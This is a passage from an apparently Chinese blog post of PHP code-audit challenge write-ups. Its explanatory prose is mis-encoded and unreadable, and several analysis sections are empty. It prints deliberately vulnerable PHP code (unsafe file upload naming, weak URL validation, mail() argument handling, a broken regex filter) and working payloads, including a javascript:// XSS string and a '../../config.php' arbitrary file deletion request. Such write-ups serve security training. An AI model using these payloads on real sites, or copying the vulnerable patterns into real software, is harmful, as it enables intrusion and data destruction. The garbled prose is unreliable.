class="string">'name'</span>]</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$challenge = <span class="keyword">new</span> Challenge($_FILES[<span class="string">'solution'</span>]);</span><br></pre></td></tr></table></figure><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array ( mixed $needle , <span class="keyword">array</span> $haystack [, bool $strict = <span class="keyword">FALSE</span> ] ) : bool</span><br></pre></td></tr></table></figure><blockquote><p>åœ¨ <strong>$haystack</strong> ä¸­æœç´¢ <strong>$needle</strong> ï¼Œå¦‚æœç¬¬ä¸‰ä¸ªå‚æ•° <strong>$strict</strong> çš„å€¼ä¸º <strong>TRUE</strong> ï¼Œåˆ™ <strong>in_array()</strong> å‡½æ•°ä¼šè¿›è¡Œå¼ºæ£€æŸ¥ï¼Œæ£€æŸ¥ <strong>$needle</strong> çš„ç±»å‹æ˜¯å¦å’Œ <strong>$haystack</strong> ä¸­çš„ç›¸åŒã€‚å¦‚æœæ‰¾åˆ° <strong>$haystack</strong> ï¼Œåˆ™è¿”å› <strong>TRUE</strong>ï¼Œå¦åˆ™è¿”å› <strong>FALSE</strong>ã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file ( string $filename , string $destination ) : bool</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯æ–‡ä»¶ä¸Šä¼ ä¸­å¸¸ç”¨çš„ä¸€ä¸ªå‡½æ•°ï¼Œæ–‡ä»¶è¢«ä¸Šä¼ ç»“æŸåï¼Œé»˜è®¤åœ°è¢«å­˜å‚¨åœ¨äº†ä¸´æ—¶ç›®å½•ä¸­ï¼Œè¿™æ—¶å¿…é¡»å°†å®ƒä»ä¸´æ—¶ç›®å½•ä¸­ç§»åŠ¨åˆ°å…¶å®ƒåœ°æ–¹ï¼Œå› ä¸ºè„šæœ¬æ‰§è¡Œå®Œåï¼Œä¸´æ—¶ç›®å½•é‡Œçš„æ–‡ä»¶ä¼šè¢«åˆ é™¤ã€‚æ‰€ä»¥è¦åœ¨åˆ é™¤ä¹‹å‰ç”¨ PHP çš„ <code>copy()</code> æˆ–è€… <code>move_upload_file()</code>  å‡½æ•°å°†å®ƒå¤åˆ¶æˆ–è€…ç§»åŠ¨åˆ°å…¶å®ƒä½ç½®ï¼Œåˆ°æ­¤ï¼Œæ‰ç®—å®Œæˆäº†ä¸Šä¼ æ–‡ä»¶è¿‡ç¨‹ã€‚</p><p>å†è§‚å¯Ÿé‡Œé¢çš„ä¸¤ä¸ªå‚æ•°ï¼Œå¦‚æœ <code>file[&#39;name&#39;]</code> æ˜¯å¯æ§çš„è¯ï¼Œå¯é€šè¿‡ <code>../</code> è¿›è¡Œç›®å½•ç©¿è¶Šã€‚</p><p>å›æº¯ä¸€ä¸‹ï¼Œåœ¨æ„é€ å‡½æ•°ä¸­å¯çœ‹åˆ°ï¼Œ<code>this-&gt;file</code> æ¥è‡ª  <code>$_FILES[&#39;solution&#39;]</code> ã€‚</p><p>æ­¤å¤„çš„ <code>$_FILES</code> æ˜¯ PHP ä¸­çš„è¶…çº§å…¨å±€å˜é‡ï¼Œè¯¥æ•°ç»„åŒ…å«æœ‰æ‰€æœ‰ä¸Šä¼ çš„æ–‡ä»¶ä¿¡æ¯ï¼Œè¿™é‡Œå¯æœ¬åœ°åšåšå®éªŒã€‚</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p><strong>æ„é€ å¦‚ä¸‹è¡¨å•</strong>ï¼ˆå«Œéº»çƒ¦å¯ä»¥ç›´æ¥ Burp æäº¤ï¼‰</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://localhost/test.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"solution"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>test.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> print_r($_FILES);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯çœ‹åˆ°å¦‚ä¸‹ç»“æœ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span> (</span><br><span class="line">    [solution] =&gt; <span class="keyword">Array</span> (</span><br><span class="line">            [name] =&gt; A.png</span><br><span class="line">            [type] =&gt; image/png</span><br><span class="line">            [tmp_name] =&gt; C:\Windows\php4F0F.tmp</span><br><span class="line">            [error] =&gt; <span class="number">0</span></span><br><span class="line">            [size] =&gt; <span class="number">40436</span></span><br><span class="line">        )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>ç»“åˆä¸Šé¢çš„ä»£ç ï¼Œ<code>this-&gt;file</code> æ˜¯ä¸­é—´çš„é‚£ä¸ªæ•°ç»„ï¼Œ<code>name</code> æ˜¯å¯æ§çš„ï¼Œå³æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶æœ¬èº«çš„åç§°ã€‚</p><p>å¤–é¢è¿˜æœ‰ä¸€ä¸ª <code>if</code> åˆ¤æ–­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array ( mixed $needle , <span class="keyword">array</span> $haystack [, bool $strict = <span class="keyword">FALSE</span> ] ) : bool</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå…¶å®å¾ˆå¥½ç»•è¿‡ï¼Œå› ä¸º <code>in_array()</code>  æ²¡æœ‰å¼€å¯ <code>strict</code>ï¼Œå°†è‡ªåŠ¨è½¬æ¢ç±»å‹ã€‚</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1bj55nnsgj20j003qt92.jpg" alt></p><p>å¯æƒœäº†ï¼Œä¸èƒ½è¿›è¡Œç›®å½•ç©¿è¶Šï¼Œåœ¨å®é™…åœºæ™¯ä¸­å¯èƒ½è¿˜è¦ç»“åˆä¸€äº›æ–‡ä»¶åŒ…å«æ‰èƒ½ <code>getshell</code>äº†ã€‚</p><h2 id="2-Twig"><a href="#2-Twig" class="headerlink" title="2 - Twig"></a>2 - Twig</h2><blockquote><p>filter_var</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// composer require "twig/twig"</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $twig;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $indexTemplate = <span class="string">'&lt;img '</span> .</span><br><span class="line">            <span class="string">'src="https://loremflickr.com/320/240"&gt;'</span> .</span><br><span class="line">            <span class="string">'&lt;a href="&#123;&#123;link|escape&#125;&#125;"&gt;Next slide &amp;raquo;&lt;/a&gt;'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Default twig setup, simulate loading</span></span><br><span class="line">        <span class="comment">// index.html file from disk</span></span><br><span class="line">        $loader = <span class="keyword">new</span> Twig\Loader\ArrayLoader([</span><br><span class="line">            <span class="string">'index.html'</span> =&gt; $indexTemplate</span><br><span class="line">        ]);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;twig = <span class="keyword">new</span> Twig\Environment($loader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNexSlideUrl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $nextSlide = $_GET[<span class="string">'nextSlide'</span>];</span><br><span class="line">        <span class="keyword">return</span> filter_var($nextSlide, FILTER_VALIDATE_URL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;twig-&gt;render(</span><br><span class="line">            <span class="string">'index.html'</span>,</span><br><span class="line">            [<span class="string">'link'</span> =&gt; <span class="keyword">$this</span>-&gt;getNexSlideUrl()]</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> Template())-&gt;render();</span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p><code>twig</code> æ˜¯ PHP çš„ä¸€ä¸ªæ¨¡æ¿å¼•æ“ã€‚æ¥æ”¶ä¸€ä¸ª URLï¼Œè¿”å› HTMLï¼Œææœ‰å¯èƒ½è§¦å‘ <code>XSS</code>äº†ã€‚</p><p>ç¬¬ä¸€é‡è¿‡æ»¤ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter_var ( mixed $variable [, int $filter=FILTER_DEFAULT[, mixed $options ]]) :mixed</span><br></pre></td></tr></table></figure><p>é¢˜ç›®ä»£ç ä¸­ä½¿ç”¨çš„æ˜¯ FILTER_VALIDATE_URL è¿‡æ»¤å™¨ï¼Œå®ƒæ‹¥æœ‰å››ä¸ªå¯èƒ½çš„æ ‡è¯†ï¼š</p><ul><li>FILTER_FLAG_SCHEME_REQUIRED - è¦æ±‚ URL æ˜¯ RFC å…¼å®¹ URLã€‚ï¼ˆæ¯”å¦‚ï¼š<code>http://example</code>ï¼‰</li><li>FILTER_FLAG_HOST_REQUIRED - è¦æ±‚ URL åŒ…å«ä¸»æœºåï¼ˆ<code>http://www.example.com</code>ï¼‰</li><li>FILTER_FLAG_PATH_REQUIRED - è¦æ±‚ URL åœ¨ä¸»æœºååå­˜åœ¨è·¯å¾„ï¼ˆæ¯”å¦‚ï¼š<code>eg.com/example1/</code>ï¼‰</li><li>FILTER_FLAG_QUERY_REQUIRED - è¦æ±‚ URL å­˜åœ¨æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆæ¯”å¦‚ï¼š<code>eg.php?age=37</code>ï¼‰</li></ul><p>ç„¶è€Œè¿™é‡Œçš„è¿‡æ»¤éå¸¸å¼±ï¼ŒåªéªŒè¯äº† <code>://</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">"a://b"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// string(5) "a://b"</span></span><br><span class="line">var_dump(filter_var($url, FILTER_VALIDATE_URL));</span><br><span class="line">var_dump(filter_var($url, FILTER_VALIDATE_URL, FILTER_FLAG_SCHEME_REQUIRED));</span><br><span class="line">var_dump(filter_var($url, FILTER_VALIDATE_URL, FILTER_FLAG_HOST_REQUIRED));</span><br><span class="line"></span><br><span class="line"><span class="comment">// bool(false)</span></span><br><span class="line">var_dump(filter_var($url, FILTER_VALIDATE_URL, FILTER_FLAG_PATH_REQUIRED));</span><br><span class="line">var_dump(filter_var($url, FILTER_VALIDATE_URL, FILTER_FLAG_QUERY_REQUIRED));</span><br></pre></td></tr></table></figure><p>åœ¨æ‰‹å†Œçš„è¯„è®ºé‡Œé¢ï¼Œæœ‰äººç›´æ¥ç»™å‡ºäº†åˆ©ç”¨æ–¹æ³•ã€‚</p><p><img src="http://ws1.sinaimg.cn/large/de75fd55gy1g325k3p39vj20nt07baak.jpg" alt></p><p>ç¬¬äºŒé‡è¿‡æ»¤ï¼š</p><blockquote><p>Internally, <code>escape</code> uses the PHP native <a href="https://secure.php.net/htmlspecialchars" target="_blank" rel="noopener">htmlspecialchars</a> function for the HTML escaping strategy.</p></blockquote><p>ç”±æ­¤å¯çœ‹å‡ºï¼Œ<code>twig</code> ä¸­çš„ <code>escape</code> å®é™…æ˜¯ç”¨ <code>htmlspecialchars</code> å®ç°çš„ã€‚</p><p>å°†ä»£ç ç®€åŒ–ä¸€ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = filter_var($_GET[<span class="string">'url'</span>], FILTER_VALIDATE_URL);</span><br><span class="line">$url = htmlspecialchars($url);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;a href=$url&gt;Next slide &amp;raquo;&lt;/a&gt;"</span>;</span><br></pre></td></tr></table></figure><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><p>åˆ°è¿™é‡Œæ€è·¯å°±æ¯”è¾ƒæ¸…æ™°äº†ï¼Œexp éœ€è¦åŒ…å« <code>://</code> ï¼Œ<code>&lt;a&gt;</code> æ ‡ç­¾å¯ä»¥ç›´æ¥æ‰“ï¼Œä¸èƒ½ç”¨å•åŒå¼•å·ä¹Ÿå½±å“ä¸å¤§ã€‚</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?nextSlide=javascri<span class="symbol">pt:</span>//<span class="number">233%</span><span class="number">250</span>aalert(<span class="number">1</span>)  // å¯¹ % ç¼–ç ä¸º %<span class="number">25</span></span><br><span class="line">=&gt;</span><br><span class="line">&lt;a href=javascri<span class="symbol">pt:</span>//<span class="number">233</span></span><br><span class="line">alert(<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure><h2 id="3-Snow-Flake"><a href="#3-Snow-Flake" class="headerlink" title="3 - Snow Flake"></a>3 - Snow Flake</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span><span class="params">($className)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">include</span> $className;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$controllerName = $_GET[<span class="string">'c'</span>];</span><br><span class="line">$data = $_GET[<span class="string">'d'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (class_exists($controllerName)) &#123;</span><br><span class="line">    $controller = <span class="keyword">new</span> $controllerName($data[<span class="string">'t'</span>], $data[<span class="string">'v'</span>]);</span><br><span class="line">    $controller-&gt;render();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'There is no page with this name'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomeController</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $template;</span><br><span class="line">    <span class="keyword">private</span> $variables;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($template, $variables)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;template = $template;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;variables = $variables;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;variables[<span class="string">'new'</span>]) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'controller rendering new response'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'controller rendering old response'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><h2 id="4-False-Beard"><a href="#4-False-Beard" class="headerlink" title="4 - False Beard"></a>4 - False Beard</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;loginViaXml($user, $pass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loginViaXml</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            (!strpos($user, <span class="string">'&lt;'</span>) || !strpos($user, <span class="string">'&gt;'</span>)) &amp;&amp;</span><br><span class="line">            (!strpos($pass, <span class="string">'&lt;'</span>) || !strpos($pass, <span class="string">'&gt;'</span>))</span><br><span class="line">        ) &#123;</span><br><span class="line">            $format = <span class="string">'&lt;?xml version="1.0"?&gt;'</span> .</span><br><span class="line">                <span class="string">'&lt;user v="%s"/&gt;&lt;pass v="%s"/&gt;'</span>;</span><br><span class="line">            $xml = sprintf($format, $user, $pass);</span><br><span class="line">            $xmlElement = <span class="keyword">new</span> SimpleXMLElement($xml);</span><br><span class="line">            <span class="comment">// Perform the actual login.</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;login($xmlElement);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Login($_POST[<span class="string">'username'</span>], $_POST[<span class="string">'password'</span>]);</span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-3"><a href="#åˆ†æ-3" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><h2 id="5-Postcard"><a href="#5-Postcard" class="headerlink" title="5 - Postcard"></a>5 - Postcard</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mailer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitize</span><span class="params">($email)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!filter_var($email, FILTER_VALIDATE_EMAIL)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> escapeshellarg($email);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">send</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'to'</span>])) &#123;</span><br><span class="line">            $data[<span class="string">'to'</span>] = <span class="string">'none@ripstech.com'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $data[<span class="string">'to'</span>] = <span class="keyword">$this</span>-&gt;sanitize($data[<span class="string">'to'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'from'</span>])) &#123;</span><br><span class="line">            $data[<span class="string">'from'</span>] = <span class="string">'none@ripstech.com'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $data[<span class="string">'from'</span>] = <span class="keyword">$this</span>-&gt;sanitize($data[<span class="string">'from'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'subject'</span>])) &#123;</span><br><span class="line">            $data[<span class="string">'subject'</span>] = <span class="string">'No Subject'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'message'</span>])) &#123;</span><br><span class="line">            $data[<span class="string">'message'</span>] = <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mail($data[<span class="string">'to'</span>], $data[<span class="string">'subject'</span>], $data[<span class="string">'message'</span>],</span><br><span class="line">             <span class="string">''</span>, <span class="string">"-f"</span> . $data[<span class="string">'from'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mailer = <span class="keyword">new</span> Mailer();</span><br><span class="line">$mailer-&gt;send($_POST);</span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-4"><a href="#åˆ†æ-4" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><h2 id="6-Frost-Pattern"><a href="#6-Frost-Pattern" class="headerlink" title="6 - Frost Pattern"></a>6 - Frost Pattern</h2><blockquote><p>preg_replace é…ç½®</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TokenStorage</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">performAction</span><span class="params">($action, $data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> ($action) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'create'</span>:</span><br><span class="line">                <span class="keyword">$this</span>-&gt;createToken($data);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'delete'</span>:</span><br><span class="line">                <span class="keyword">$this</span>-&gt;clearToken($data);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'Unknown action'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createToken</span><span class="params">($seed)</span> </span>&#123;</span><br><span class="line">        $token = md5($seed);</span><br><span class="line">        file_put_contents(<span class="string">'/tmp/tokens/'</span> . $token, <span class="string">'...data'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">clearToken</span><span class="params">($token)</span> </span>&#123;</span><br><span class="line">        $file = preg_replace(<span class="string">"/[^a-z.-_]/"</span>, <span class="string">""</span>, $token);</span><br><span class="line">        unlink(<span class="string">'/tmp/tokens/'</span> . $file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$storage = <span class="keyword">new</span> TokenStorage();</span><br><span class="line">$storage-&gt;performAction($_GET[<span class="string">'action'</span>], $_GET[<span class="string">'data'</span>]);</span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-5"><a href="#åˆ†æ-5" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>æœ¬é¢˜å®ç°çš„åŠŸèƒ½å°±ä¸¤ä¸ªï¼Œå†™æ–‡ä»¶ã€åˆ é™¤æ–‡ä»¶ã€‚</p><p><code>createToken()</code> å”¯ä¸€å¯æ§çš„å°±æ˜¯ <code>seed</code> ï¼Œç„¶è€Œæ–‡ä»¶åè¿˜è¢«å®Œå…¨é™æ­»ï¼Œå†…å®¹ä¹Ÿä¸å¯æ§ã€‚</p><p><code>clearToken()</code> æœ‰ä¸€ä¸ªæ­£åˆ™åŒ¹é…çš„è¿‡æ»¤ï¼Œä¸è¿‡<code>/[^a-z.-_]/</code> è¿™é‡Œé…ç½®æœ‰ç‚¹é—®é¢˜ã€‚</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1f65tmt8vj20jd02l0sz.jpg" alt></p><h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h3><p>ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=<span class="keyword">delete</span>&amp;data=../../<span class="built_in">config</span>.php</span><br></pre></td></tr></table></figure><h2 id="7-Bells"><a 